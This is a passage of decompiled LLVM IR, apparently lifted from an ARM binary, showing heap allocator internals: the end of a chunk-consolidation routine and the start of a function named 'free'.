  store i32 %v1_1352025, i32* %v3_1352827, align 4
  %v0_1352c28 = load i32, i32* %r3.global-to-local, align 4
  %v2_1352c29 = add i32 %v0_1352c28, 12
  %v3_1352c30 = inttoptr i32 %v2_1352c29 to i32*
  store i32 %v0_1352c28, i32* %v3_1352c30, align 4
  br label %dec_label_pc_13518.dec_label_pc_13518_crit_edge

dec_label_pc_133f4:                               ; preds = %entry
  %v1_133f4 = and i32 %v2_133dc, -3
  %v3_133f8 = udiv i32 %v2_133dc, 8
  store i32 %v3_133f8, i32* %r2.global-to-local, align 4
  store i32 %v1_133f4, i32* %v1_133dc, align 4
  %v0_13400 = load i32, i32* @r0, align 4
  %v1_13400 = add i32 %v0_13400, -4
  store i32 %v1_13400, i32* %r3.global-to-local, align 4
  %v1_13404 = load i32, i32* %r2.global-to-local, align 4
  %v4_13404 = mul i32 %v1_13404, 4
  %v5_13404 = add i32 %v4_13404, %v1_13400
  store i32 %v5_13404, i32* %sb.global-to-local, align 4
  %v1_13408 = add i32 %v0_13400, 52
  store i32 %v1_13408, i32* %r7.global-to-local, align 4
  %v1_1340c = add i32 %v0_13400, 4
  store i32 %v1_1340c, i32* %r6.global-to-local, align 4
  store i32 0, i32* %fp.global-to-local, align 4
  br label %dec_label_pc_13414

dec_label_pc_13414:                               ; preds = %dec_label_pc_13510, %dec_label_pc_133f4
  %v1_1350810 = phi i32 [ %v1_13508, %dec_label_pc_13510 ], [ %v5_13404, %dec_label_pc_133f4 ]
  %v1_13420 = phi i32 [ %v1_13510, %dec_label_pc_13510 ], [ %v1_1340c, %dec_label_pc_133f4 ]
  %v1_13414 = inttoptr i32 %v1_13420 to i32*
  %v2_13414 = load i32, i32* %v1_13414, align 4
  store i32 %v2_13414, i32* %r1.global-to-local, align 4
  %v2_13418 = icmp eq i32 %v2_13414, 0
  br i1 %v2_13418, label %dec_label_pc_13508, label %dec_label_pc_13420

dec_label_pc_13420:                               ; preds = %dec_label_pc_13414
  %v0_13420 = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_13420, i32* %v1_13414, align 4
  %v0_13424.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_13424

dec_label_pc_13424:                               ; preds = %dec_label_pc_134fc, %dec_label_pc_13420
  %v0_13440 = phi i32 [ %v0_134fc, %dec_label_pc_134fc ], [ %v0_13424.pre, %dec_label_pc_13420 ]
  %v1_13424 = add i32 %v0_13440, 4
  %v2_13424 = inttoptr i32 %v1_13424 to i32*
  %v3_13424 = load i32, i32* %v2_13424, align 4
  store i32 %v3_13424, i32* %r3.global-to-local, align 4
  %v1_13428 = and i32 %v3_13424, -2
  store i32 %v1_13428, i32* %lr.global-to-local, align 4
  %v2_1342c = add i32 %v1_13428, %v0_13440
  store i32 %v2_1342c, i32* @r0, align 4
  %v1_13430 = urem i32 %v3_13424, 2
  %v2_13430 = icmp eq i32 %v1_13430, 0
  %v1_13434 = add i32 %v0_13440, 8
  %v2_13434 = inttoptr i32 %v1_13434 to i32*
  %v3_13434 = load i32, i32* %v2_13434, align 4
  store i32 %v3_13434, i32* %sl.global-to-local, align 4
  %v1_13438 = add i32 %v2_1342c, 4
  %v2_13438 = inttoptr i32 %v1_13438 to i32*
  %v3_13438 = load i32, i32* %v2_13438, align 4
  store i32 %v3_13438, i32* %r8.global-to-local, align 4
  br i1 %v2_13430, label %dec_label_pc_13440, label %dec_label_pc_13474

dec_label_pc_13440:                               ; preds = %dec_label_pc_13424
  %v1_13440 = inttoptr i32 %v0_13440 to i32*
  %v2_13440 = load i32, i32* %v1_13440, align 4
  store i32 %v2_13440, i32* %r5.global-to-local, align 4
  %v2_13444 = sub i32 %v0_13440, %v2_13440
  store i32 %v2_13444, i32* %r3.global-to-local, align 4
  %v1_13448 = add i32 %v2_13444, 8
  %v2_13448 = inttoptr i32 %v1_13448 to i32*
  %v3_13448 = load i32, i32* %v2_13448, align 4
  store i32 %v3_13448, i32* %ip.global-to-local, align 4
  %v1_1344c = add i32 %v3_13448, 12
  %v2_1344c = inttoptr i32 %v1_1344c to i32*
  %v3_1344c = load i32, i32* %v2_1344c, align 4
  store i32 %v3_1344c, i32* %r1.global-to-local, align 4
  %v9_13450 = icmp eq i32 %v3_1344c, %v2_13444
  %v1_13454 = add i32 %v2_13444, 12
  %v2_13454 = inttoptr i32 %v1_13454 to i32*
  %v3_13454 = load i32, i32* %v2_13454, align 4
  store i32 %v3_13454, i32* %r2.global-to-local, align 4
  br i1 %v9_13450, label %dec_label_pc_1345c, label %dec_label_pc_134b8

dec_label_pc_1345c:                               ; preds = %dec_label_pc_13440
  %v1_1345c = add i32 %v3_13454, 8
  %v2_1345c = inttoptr i32 %v1_1345c to i32*
  %v3_1345c = load i32, i32* %v2_1345c, align 4
  store i32 %v3_1345c, i32* %r3.global-to-local, align 4
  %v9_13460 = icmp eq i32 %v3_1345c, %v2_13444
  br i1 %v9_13460, label %dec_label_pc_13468, label %dec_label_pc_134b8

dec_label_pc_13468:                               ; preds = %dec_label_pc_1345c
  store i32 %v3_13448, i32* %v2_1345c, align 4
  %v0_1346c = load i32, i32* %r2.global-to-local, align 4
  %v1_1346c = load i32, i32* %ip.global-to-local, align 4
  %v2_1346c = add i32 %v1_1346c, 12
  %v3_1346c = inttoptr i32 %v2_1346c to i32*
  store i32 %v0_1346c, i32* %v3_1346c, align 4
  %v0_13470 = load i32, i32* %lr.global-to-local, align 4
  %v1_13470 = load i32, i32* %r5.global-to-local, align 4
  %v2_13470 = add i32 %v1_13470, %v0_13470
  store i32 %v2_13470, i32* %lr.global-to-local, align 4
  %v0_13478.pre = load i32, i32* @r0, align 4
  %v0_1347c.pre = load i32, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_13474

dec_label_pc_13474:                               ; preds = %dec_label_pc_13424, %dec_label_pc_13468
  %v0_134ec = phi i32 [ %v1_13428, %dec_label_pc_13424 ], [ %v2_13470, %dec_label_pc_13468 ]
  %v0_1347c = phi i32 [ %v3_13438, %dec_label_pc_13424 ], [ %v0_1347c.pre, %dec_label_pc_13468 ]
  %v1_13490 = phi i32 [ %v2_1342c, %dec_label_pc_13424 ], [ %v0_13478.pre, %dec_label_pc_13468 ]
  %v0_13474 = load i32, i32* @r4, align 4
  %v1_13474 = add i32 %v0_13474, 44
  %v2_13474 = inttoptr i32 %v1_13474 to i32*
  %v3_13474 = load i32, i32* %v2_13474, align 4
  store i32 %v3_13474, i32* %r3.global-to-local, align 4
  %v9_13478 = icmp eq i32 %v1_13490, %v3_13474
  %v1_1347c = and i32 %v0_1347c, -4
  store i32 %v1_1347c, i32* %r5.global-to-local, align 4
  br i1 %v9_13478, label %dec_label_pc_134ec, label %dec_label_pc_13484

dec_label_pc_13484:                               ; preds = %dec_label_pc_13474
  %v2_13484 = add i32 %v1_13490, %v1_1347c
  store i32 %v2_13484, i32* %r3.global-to-local, align 4
  %v1_13488 = add i32 %v2_13484, 4
  %v2_13488 = inttoptr i32 %v1_13488 to i32*
  %v3_13488 = load i32, i32* %v2_13488, align 4
  store i32 %v3_13488, i32* %r3.global-to-local, align 4
  %v1_1348c = urem i32 %v3_13488, 2
  %v2_1348c = icmp eq i32 %v1_1348c, 0
  %v2_13490 = add i32 %v1_13490, 4
  %v3_13490 = inttoptr i32 %v2_13490 to i32*
  store i32 %v1_1347c, i32* %v3_13490, align 4
  br i1 %v2_1348c, label %dec_label_pc_13498, label %dec_label_pc_13484.dec_label_pc_134c8_crit_edge

dec_label_pc_13484.dec_label_pc_134c8_crit_edge:  ; preds = %dec_label_pc_13484
  %v0_134cc.pre = load i32, i32* %lr.global-to-local, align 4
  br label %dec_label_pc_134c8

dec_label_pc_13498:                               ; preds = %dec_label_pc_13484
  %v0_13498 = load i32, i32* @r0, align 4
  %v1_13498 = add i32 %v0_13498, 8
  %v2_13498 = inttoptr i32 %v1_13498 to i32*
  %v3_13498 = load i32, i32* %v2_13498, align 4
  store i32 %v3_13498, i32* %ip.global-to-local, align 4
  %v1_1349c = add i32 %v3_13498, 12
  %v2_1349c = inttoptr i32 %v1_1349c to i32*
  %v3_1349c = load i32, i32* %v2_1349c, align 4
  store i32 %v3_1349c, i32* %r3.global-to-local, align 4
  %v9_134a0 = icmp eq i32 %v3_1349c, %v0_13498
  %v1_134a4 = add i32 %v0_13498, 12
  %v2_134a4 = inttoptr i32 %v1_134a4 to i32*
  %v3_134a4 = load i32, i32* %v2_134a4, align 4
  store i32 %v3_134a4, i32* %r2.global-to-local, align 4
  br i1 %v9_134a0, label %dec_label_pc_134ac, label %dec_label_pc_134b8

dec_label_pc_134ac:                               ; preds = %dec_label_pc_13498
  %v1_134ac = add i32 %v3_134a4, 8
  %v2_134ac = inttoptr i32 %v1_134ac to i32*
  %v3_134ac = load i32, i32* %v2_134ac, align 4
  store i32 %v3_134ac, i32* %r3.global-to-local, align 4
  %v9_134b0 = icmp eq i32 %v3_134ac, %v0_13498
  br i1 %v9_134b0, label %dec_label_pc_134bc, label %dec_label_pc_134b8

dec_label_pc_134b8:                               ; preds = %dec_label_pc_13498, %dec_label_pc_1345c, %dec_label_pc_13440, %dec_label_pc_134ac
  %v0_134b8 = call i32 @abort()
  store i32 %v0_134b8, i32* @r0, align 4
  %v0_134bc.pre = load i32, i32* @ip, align 4
  %v1_134bc.pre = load i32, i32* @r2, align 4
  br label %dec_label_pc_134bc

dec_label_pc_134bc:                               ; preds = %dec_label_pc_134ac, %dec_label_pc_134b8
  %v1_134bc = phi i32 [ %v3_134a4, %dec_label_pc_134ac ], [ %v1_134bc.pre, %dec_label_pc_134b8 ]
  %v0_134bc = phi i32 [ %v3_13498, %dec_label_pc_134ac ], [ %v0_134bc.pre, %dec_label_pc_134b8 ]
  %v2_134bc = add i32 %v1_134bc, 8
  %v3_134bc = inttoptr i32 %v2_134bc to i32*
  store i32 %v0_134bc, i32* %v3_134bc, align 4
  %v0_134c0 = load i32, i32* %r2.global-to-local, align 4
  %v1_134c0 = load i32, i32* %ip.global-to-local, align 4
  %v2_134c0 = add i32 %v1_134c0, 12
  %v3_134c0 = inttoptr i32 %v2_134c0 to i32*
  store i32 %v0_134c0, i32* %v3_134c0, align 4
  %v0_134c4 = load i32, i32* %lr.global-to-local, align 4
  %v1_134c4 = load i32, i32* %r5.global-to-local, align 4
  %v2_134c4 = add i32 %v1_134c4, %v0_134c4
  store i32 %v2_134c4, i32* %lr.global-to-local, align 4
  br label %dec_label_pc_134c8

dec_label_pc_134c8:                               ; preds = %dec_label_pc_13484.dec_label_pc_134c8_crit_edge, %dec_label_pc_134bc
  %v0_134cc = phi i32 [ %v0_134cc.pre, %dec_label_pc_13484.dec_label_pc_134c8_crit_edge ], [ %v2_134c4, %dec_label_pc_134bc ]
  %v0_134c8 = load i32, i32* %r7.global-to-local, align 4
  %v1_134c8 = add i32 %v0_134c8, 8
  %v2_134c8 = inttoptr i32 %v1_134c8 to i32*
  %v3_134c8 = load i32, i32* %v2_134c8, align 4
  store i32 %v3_134c8, i32* %r2.global-to-local, align 4
  %v1_134cc = or i32 %v0_134cc, 1
  store i32 %v1_134cc, i32* %r3.global-to-local, align 4
  %v0_134d0 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v0_134d0, i32* %v2_134c8, align 4
  %v0_134d4 = load i32, i32* %r1.global-to-local, align 4
  %v1_134d4 = load i32, i32* %r2.global-to-local, align 4
  %v2_134d4 = add i32 %v1_134d4, 12
  %v3_134d4 = inttoptr i32 %v2_134d4 to i32*
  store i32 %v0_134d4, i32* %v3_134d4, align 4
  %v0_134d8 = load i32, i32* %lr.global-to-local, align 4
  %v1_134d8 = load i32, i32* %r1.global-to-local, align 4
  %v3_134d8 = add i32 %v1_134d8, %v0_134d8
  %v4_134d8 = inttoptr i32 %v3_134d8 to i32*
  store i32 %v0_134d8, i32* %v4_134d8, align 4
  %v0_134dc = load i32, i32* %r3.global-to-local, align 4
  %v1_134dc = load i32, i32* %r1.global-to-local, align 4
  %v2_134dc = add i32 %v1_134dc, 4
  %v3_134dc = inttoptr i32 %v2_134dc to i32*
  store i32 %v0_134dc, i32* %v3_134dc, align 4
  %v0_134e0 = load i32, i32* %r2.global-to-local, align 4
  %v1_134e0 = load i32, i32* %r1.global-to-local, align 4
  %v2_134e0 = add i32 %v1_134e0, 8
  %v3_134e0 = inttoptr i32 %v2_134e0 to i32*
  store i32 %v0_134e0, i32* %v3_134e0, align 4
  %v0_134e4 = load i32, i32* %r7.global-to-local, align 4
  %v1_134e4 = load i32, i32* %r1.global-to-local, align 4
  %v2_134e4 = add i32 %v1_134e4, 12
  %v3_134e4 = inttoptr i32 %v2_134e4 to i32*
  store i32 %v0_134e4, i32* %v3_134e4, align 4
  br label %dec_label_pc_134fc

dec_label_pc_134ec:                               ; preds = %dec_label_pc_13474
  %v2_134ec = add i32 %v1_1347c, %v0_134ec
  %v1_134f0 = or i32 %v2_134ec, 1
  store i32 %v1_134f0, i32* %r3.global-to-local, align 4
  %v1_134f4 = load i32, i32* %r1.global-to-local, align 4
  %v2_134f4 = add i32 %v1_134f4, 4
  %v3_134f4 = inttoptr i32 %v2_134f4 to i32*
  store i32 %v1_134f0, i32* %v3_134f4, align 4
  %v0_134f8 = load i32, i32* %r1.global-to-local, align 4
  %v1_134f8 = load i32, i32* @r4, align 4
  %v2_134f8 = add i32 %v1_134f8, 44
  %v3_134f8 = inttoptr i32 %v2_134f8 to i32*
  store i32 %v0_134f8, i32* %v3_134f8, align 4
  br label %dec_label_pc_134fc

dec_label_pc_134fc:                               ; preds = %dec_label_pc_134c8, %dec_label_pc_134ec
  %v0_134fc = load i32, i32* %sl.global-to-local, align 4
  %v2_134fc = icmp eq i32 %v0_134fc, 0
  store i32 %v0_134fc, i32* %r1.global-to-local, align 4
  br i1 %v2_134fc, label %dec_label_pc_13508.loopexit, label %dec_label_pc_13424

dec_label_pc_13508.loopexit:                      ; preds = %dec_label_pc_134fc
  %v0_13508.pre = load i32, i32* %r6.global-to-local, align 4
  %v1_13508.pre = load i32, i32* %sb.global-to-local, align 4
  br label %dec_label_pc_13508

dec_label_pc_13508:                               ; preds = %dec_label_pc_13508.loopexit, %dec_label_pc_13414
  %v1_13508 = phi i32 [ %v1_13508.pre, %dec_label_pc_13508.loopexit ], [ %v1_1350810, %dec_label_pc_13414 ]
  %v0_13510 = phi i32 [ %v0_13508.pre, %dec_label_pc_13508.loopexit ], [ %v1_13420, %dec_label_pc_13414 ]
  %v9_13508 = icmp eq i32 %v0_13510, %v1_13508
  br i1 %v9_13508, label %dec_label_pc_13580, label %dec_label_pc_13510

dec_label_pc_13510:                               ; preds = %dec_label_pc_13508
  %v1_13510 = add i32 %v0_13510, 4
  store i32 %v1_13510, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_13414

dec_label_pc_13518.dec_label_pc_13518_crit_edge:  ; preds = %dec_label_pc_13518.preheader, %dec_label_pc_13518.dec_label_pc_13518_crit_edge
  %v0_13518.pre = load i32, i32* @r4, align 4
  %v1_13518.pre = load i32, i32* %r2.global-to-local, align 4
  %v4_13518 = mul i32 %v1_13518.pre, 8
  %v5_13518 = add i32 %v4_13518, %v0_13518.pre
  %v1_1351c = add i32 %v1_13518.pre, 1
  store i32 %v1_1351c, i32* %r2.global-to-local, align 4
  %v1_13520 = add i32 %v5_13518, 44
  store i32 %v1_13520, i32* %r3.global-to-local, align 4
  %v2_13528 = add i32 %v5_13518, 52
  %v3_13528 = inttoptr i32 %v2_13528 to i32*
  store i32 %v1_13520, i32* %v3_13528, align 4
  %v0_1352c = load i32, i32* %r3.global-to-local, align 4
  %v2_1352c = add i32 %v0_1352c, 12
  %v3_1352c = inttoptr i32 %v2_1352c to i32*
  store i32 %v0_1352c, i32* %v3_1352c, align 4
  %v7_13530 = icmp sgt i32 %v1_1351c, 95
  br i1 %v7_13530, label %dec_label_pc_13534, label %dec_label_pc_13518.dec_label_pc_13518_crit_edge

dec_label_pc_13534:                               ; preds = %dec_label_pc_13518.dec_label_pc_13518_crit_edge
  %v0_13534 = load i32, i32* @r4, align 4
  %v1_13534 = inttoptr i32 %v0_13534 to i32*
  %v2_13534 = load i32, i32* %v1_13534, align 4
  store i32 %v2_13534, i32* %r2.global-to-local, align 4
  %v1_13538 = add i32 %v0_13534, 864
  %v2_13538 = inttoptr i32 %v1_13538 to i32*
  %v3_13538 = load i32, i32* %v2_13538, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v1_13540 = urem i32 %v2_13534, 4
  store i32 262144, i32* %r0.global-to-local, align 4
  %v1_13548 = or i32 %v3_13538, 1
  store i32 %v1_13548, i32* %r1.global-to-local, align 4
  %v1_1354c = or i32 %v1_13540, 72
  store i32 %v1_1354c, i32* %r2.global-to-local, align 4
  %v1_13550 = add i32 %v0_13534, 52
  store i32 %v1_13550, i32* %ip.global-to-local, align 4
  %v2_13554 = add i32 %v0_13534, 840
  %v3_13554 = inttoptr i32 %v2_13554 to i32*
  store i32 0, i32* %v3_13554, align 4
  %v0_13558 = load i32, i32* %r3.global-to-local, align 4
  %v1_13558 = add i32 %v0_13558, 65536
  store i32 %v1_13558, i32* %r3.global-to-local, align 4
  %v0_1355c = load i32, i32* %r0.global-to-local, align 4
  %v1_1355c = load i32, i32* @r4, align 4
  %v2_1355c = add i32 %v1_1355c, 836
  %v3_1355c = inttoptr i32 %v2_1355c to i32*
  store i32 %v0_1355c, i32* %v3_1355c, align 4
  %v0_13560 = load i32, i32* %r0.global-to-local, align 4
  %v1_13560 = load i32, i32* @r4, align 4
  %v2_13560 = add i32 %v1_13560, 844
  %v3_13560 = inttoptr i32 %v2_13560 to i32*
  store i32 %v0_13560, i32* %v3_13560, align 4
  %v1_13564 = load i32, i32* @r4, align 4
  %v2_13564 = add i32 %v1_13564, 852
  %v3_13564 = inttoptr i32 %v2_13564 to i32*
  store i32 %v1_13558, i32* %v3_13564, align 4
  %v1_13568 = load i32, i32* @r4, align 4
  %v2_13568 = add i32 %v1_13568, 864
  %v3_13568 = inttoptr i32 %v2_13568 to i32*
  store i32 %v1_13548, i32* %v3_13568, align 4
  %v1_1356c = load i32, i32* @r4, align 4
  %v2_1356c = inttoptr i32 %v1_1356c to i32*
  store i32 %v1_1354c, i32* %v2_1356c, align 4
  %v0_13570 = load i32, i32* %ip.global-to-local, align 4
  %v1_13570 = load i32, i32* @r4, align 4
  %v2_13570 = add i32 %v1_13570, 44
  %v3_13570 = inttoptr i32 %v2_13570 to i32*
  store i32 %v0_13570, i32* %v3_13570, align 4
  store i32 30, i32* %r0.global-to-local, align 4
  %v4_13578 = call i32 @sysconf(i32 30, i32 %v1_13548, i32 %v1_1354c, i32 %v1_13558)
  store i32 %v4_13578, i32* @r0, align 4
  %v1_1357c = load i32, i32* @r4, align 4
  %v2_1357c = add i32 %v1_1357c, 860
  %v3_1357c = inttoptr i32 %v2_1357c to i32*
  store i32 %v4_13578, i32* %v3_1357c, align 4
  br label %dec_label_pc_13580

dec_label_pc_13580:                               ; preds = %dec_label_pc_13508, %dec_label_pc_13534
  %v2_13584 = load i32, i32* %stack_var_-36, align 4
  store i32 %v2_13584, i32* @r4, align 4
  %v1_13588 = load i32, i32* @r0, align 4
  ret i32 %v1_13588

; uselistorder directives
  uselistorder i32 %v0_13534, { 1, 0, 2, 3 }
  uselistorder i32 %v0_1352c, { 1, 0 }
  uselistorder i32 %v1_13510, { 1, 0 }
  uselistorder i32 %v0_134fc, { 0, 2, 1 }
  uselistorder i32 %v0_134d8, { 1, 0 }
  uselistorder i32 %v1_13428, { 1, 0, 2 }
  uselistorder i32 %v0_13440, { 2, 1, 3, 0, 4 }
  uselistorder i32 %v0_13400, { 1, 0, 2 }
  uselistorder i32* %r3.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 18, 19, 17 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 4, 3, 5, 6, 7, 8, 9, 10, 11, 12, 13, 0 }
  uselistorder i32* %r1.global-to-local, { 0, 1, 4, 5, 6, 7, 8, 9, 10, 11, 2, 3, 12 }
  uselistorder i32* %lr.global-to-local, { 3, 0, 4, 2, 1, 5, 6 }
  uselistorder i32 860, { 2, 1, 0, 3 }
  uselistorder i32 30, { 1, 12, 6, 5, 2, 3, 4, 0, 10, 11, 8, 9, 7 }
  uselistorder label %dec_label_pc_13580, { 1, 0 }
  uselistorder label %dec_label_pc_13518.dec_label_pc_13518_crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_134fc, { 1, 0 }
  uselistorder label %dec_label_pc_134c8, { 1, 0 }
  uselistorder label %dec_label_pc_134bc, { 1, 0 }
  uselistorder label %dec_label_pc_134b8, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_13474, { 1, 0 }
}

define i32 @free() local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %v3_1358c = load i32, i32* @r4, align 4
  %v6_1358c = load i32, i32* @r5, align 4
  %v9_1358c = load i32, i32* @r6, align 4
  %v12_1358c = load i32, i32* @r7, align 4
  %v18_1358c = load i32, i32* @lr, align 4
  %v0_13594 = load i32, i32* @r0, align 4
  store i32 %v0_13594, i32* @r6, align 4
  %v2_13594 = icmp eq i32 %v0_13594, 0
  %v2_13598 = ptrtoint i32* %stack_var_-40 to i32
  store i32 ptrtoint (i32* @global_var_22204.365 to i32), i32* @r7, align 4
  br i1 %v2_13594, label %dec_label_pc_137a0, label %dec_label_pc_135a4

dec_label_pc_135a4:                               ; preds = %entry
  store i32 108, i32* %r3.global-to-local, align 4
  %v4_135a8 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_22204.365 to i32), i32 108) to i32*), align 4
  store i32 %v4_135a8, i32* %r4.global-to-local, align 4
  store i32 68, i32* %r3.global-to-local, align 4
  store i32 %v4_135a8, i32* %r2.global-to-local, align 4
  %v4_135b4 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_22204.365 to i32), i32 68) to i32*), align 4
  store i32 %v4_135b4, i32* %r1.global-to-local, align 4
  store i32 %v2_13598, i32* %r0.global-to-local, align 4
  store i32 112, i32* %r3.global-to-local, align 4
  %v4_135c0 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_22204.365 to i32), i32 112) to i32*), align 4
  store i32 %v4_135c0, i32* %ip.global-to-local, align 4
  store i32 79308, i32* %lr.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_135c0)
  %v0_135cc = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_135cc, i32* %r0.global-to-local, align 4
  store i32 16, i32* %r3.global-to-local, align 4
  %v0_135d4 = load i32, i32* @r7, align 4
  %v2_135d4 = add i32 %v0_135d4, 16
  %v3_135d4 = inttoptr i32 %v2_135d4 to i32*
  %v4_135d4 = load i32, i32* %v3_135d4, align 4
  store i32 %v4_135d4, i32* %ip.global-to-local, align 4
  store i32 79328, i32* %lr.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_135d4)
  store i32 64, i32* %r3.global-to-local, align 4
  %v0_135e4 = load i32, i32* @r7, align 4
  %v2_135e4 = add i32 %v0_135e4, 64
  %v3_135e4 = inttoptr i32 %v2_135e4 to i32*
  %v4_135e4 = load i32, i32* %v3_135e4, align 4
  store i32 %v4_135e4, i32* @lr, align 4
  %v0_135e8 = load i32, i32* @r6, align 4
  %v1_135e8 = add i32 %v0_135e8, -4
  %v2_135e8 = inttoptr i32 %v1_135e8 to i32*
  %v3_135e8 = load i32, i32* %v2_135e8, align 4
  store i32 %v3_135e8, i32* %r2.global-to-local, align 4
  %v1_135ec = inttoptr i32 %v4_135e4 to i32*
  %v2_135ec = load i32, i32* %v1_135ec, align 4
  store i32 %v2_135ec, i32* %r3.global-to-local, align 4
  %v1_135f0 = and i32 %v3_135e8, -4
  store i32 %v1_135f0, i32* %ip.global-to-local, align 4
  %v1_135f4 = add i32 %v0_135e8, -8
  store i32 %v1_135f4, i32* @r5, align 4
  store i32 %v1_135f4, i32* %r4.global-to-local, align 4
  %tmp = icmp ugt i32 %v1_135f0, %v2_135ec
  br i1 %tmp, label %dec_label_pc_13624, label %dec_label_pc_13604

dec_label_pc_13604:                               ; preds = %dec_label_pc_135a4
  %v1_13604 = or i32 %v2_135ec, 3
  store i32 %v1_13604, i32* %r3.global-to-local, align 4
  store i32 %v1_13604, i32* %v1_135ec, align 4
  %v3_13608 = load i32, i32* @lr, align 4
  %v4_13608 = add i32 %v3_13608, -8
  store i32 %v4_13608, i32* %lr.global-to-local, align 4
  %v0_1360c = load i32, i32* %ip.global-to-local, align 4
  %v3_1360c = udiv i32 %v0_1360c, 8
  store i32 %v3_1360c, i32* %r1.global-to-local, align 4
  %v1_13610 = add i32 %v3_13608, -4
  store i32 %v1_13610, i32* %r2.global-to-local, align 4
  %v4_13614 = mul nuw i32 %v3_1360c, 4
  %v5_13614 = add i32 %v4_13614, %v1_13610
  %v6_13614 = inttoptr i32 %v5_13614 to i32*
  %v7_13614 = load i32, i32* %v6_13614, align 4
  store i32 %v7_13614, i32* %r3.global-to-local, align 4
  %v1_13618 = load i32, i32* @r5, align 4
  %v2_13618 = add i32 %v1_13618, 8
  %v3_13618 = inttoptr i32 %v2_13618 to i32*
  store i32 %v7_13614, i32* %v3_13618, align 4
  %v0_1361c = load i32, i32* @r5, align 4
  %v1_1361c = load i32, i32* %r2.global-to-local, align 4
  %v2_1361c = load i32, i32* %r1.global-to-local, align 4
  %v5_1361c = mul i32 %v2_1361c, 4
  %v6_1361c = add i32 %v5_1361c, %v1_1361c
  %v7_1361c = inttoptr i32 %v6_1361c to i32*
  store i32 %v0_1361c, i32* %v7_1361c, align 4
  br label %dec_label_pc_13788

dec_label_pc_13624:                               ; preds = %dec_label_pc_135a4
  %v1_13624 = and i32 %v3_135e8, 2
  %v2_13624 = icmp eq i32 %v1_13624, 0
  br i1 %v2_13624, label %dec_label_pc_1362c, label %dec_label_pc_13760

dec_label_pc_1362c:                               ; preds = %dec_label_pc_13624
  %v1_1362c = or i32 %v2_135ec, 1
  store i32 %v1_1362c, i32* %r3.global-to-local, align 4
  store i32 %v1_1362c, i32* %v1_135ec, align 4
  %v0_13634 = load i32, i32* @r6, align 4
  %v1_13634 = add i32 %v0_13634, -4
  %v2_13634 = inttoptr i32 %v1_13634 to i32*
  %v3_13634 = load i32, i32* %v2_13634, align 4
  store i32 %v3_13634, i32* %r3.global-to-local, align 4
  %v0_13638 = load i32, i32* @r5, align 4
  %v1_13638 = load i32, i32* %ip.global-to-local, align 4
  %v2_13638 = add i32 %v1_13638, %v0_13638
  store i32 %v2_13638, i32* %lr.global-to-local, align 4
  %v1_1363c = urem i32 %v3_13634, 2
  %v2_1363c = icmp eq i32 %v1_1363c, 0
  %v1_13640 = add i32 %v2_13638, 4
  %v2_13640 = inttoptr i32 %v1_13640 to i32*
  %v3_13640 = load i32, i32* %v2_13640, align 4
  store i32 %v3_13640, i32* %r8.global-to-local, align 4
  br i1 %v2_1363c, label %dec_label_pc_13648, label %dec_label_pc_1367c

dec_label_pc_13648:                               ; preds = %dec_label_pc_1362c
  %v1_13648 = add i32 %v0_13634, -8
  %v2_13648 = inttoptr i32 %v1_13648 to i32*
  %v3_13648 = load i32, i32* %v2_13648, align 4
  store i32 %v3_13648, i32* %r1.global-to-local, align 4
  %v2_1364c = sub i32 %v0_13638, %v3_13648
  store i32 %v2_1364c, i32* %r3.global-to-local, align 4
  %v1_13650 = add i32 %v2_1364c, 8
  %v2_13650 = inttoptr i32 %v1_13650 to i32*
  %v3_13650 = load i32, i32* %v2_13650, align 4
  store i32 %v3_13650, i32* %r2.global-to-local, align 4
  %v1_13654 = add i32 %v3_13650, 12
  %v2_13654 = inttoptr i32 %v1_13654 to i32*
  %v3_13654 = load i32, i32* %v2_13654, align 4
  store i32 %v3_13654, i32* %r4.global-to-local, align 4
  %v9_13658 = icmp eq i32 %v3_13654, %v2_1364c
  %v1_1365c = add i32 %v2_1364c, 12
  %v2_1365c = inttoptr i32 %v1_1365c to i32*
  %v3_1365c = load i32, i32* %v2_1365c, align 4
  store i32 %v3_1365c, i32* %r0.global-to-local, align 4
  br i1 %v9_13658, label %dec_label_pc_13664, label %dec_label_pc_136c8

dec_label_pc_13664:                               ; preds = %dec_label_pc_13648
  %v1_13664 = add i32 %v3_1365c, 8
  %v2_13664 = inttoptr i32 %v1_13664 to i32*
  %v3_13664 = load i32, i32* %v2_13664, align 4
  store i32 %v3_13664, i32* %r3.global-to-local, align 4
  %v9_13668 = icmp eq i32 %v3_13664, %v2_1364c
  br i1 %v9_13668, label %dec_label_pc_13670, label %dec_label_pc_136c8

dec_label_pc_13670:                               ; preds = %dec_label_pc_13664
  store i32 %v3_13650, i32* %v2_13664, align 4
  %v0_13674 = load i32, i32* %r0.global-to-local, align 4
  %v1_13674 = load i32, i32* %r2.global-to-local, align 4
  %v2_13674 = add i32 %v1_13674, 12
  %v3_13674 = inttoptr i32 %v2_13674 to i32*
  store i32 %v0_13674, i32* %v3_13674, align 4
  %v0_13678 = load i32, i32* %ip.global-to-local, align 4
  %v1_13678 = load i32, i32* %r1.global-to-local, align 4
  %v2_13678 = add i32 %v1_13678, %v0_13678
  store i32 %v2_13678, i32* %ip.global-to-local, align 4
  %v0_13688.pre = load i32, i32* %lr.global-to-local, align 4
  %v0_1368c.pre = load i32, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_1367c

